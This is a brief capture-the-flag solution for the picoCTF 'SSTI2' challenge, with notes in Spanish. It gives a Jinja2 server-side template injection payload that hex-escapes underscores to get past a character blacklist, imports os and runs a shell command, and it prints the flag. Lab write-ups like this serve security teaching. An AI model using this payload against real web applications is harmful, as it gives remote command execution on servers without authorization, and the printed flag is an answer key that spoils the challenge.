
## SSTI2
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:58506/)!

Hints:
1. Server Side Template Injection
2. Why is blacklisting characters a bad idea to sanitize input?

## Solución:

//Ingresar esto y darle OK
```

{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')() }}



Flag: picoCTF{sst1_f1lt3r_byp4ss_e964f71b}

```

//Link de ayuda
https://aathilducky.com/ssti2-picoctf-walkthrough-web-exploitation-challenge-guide/

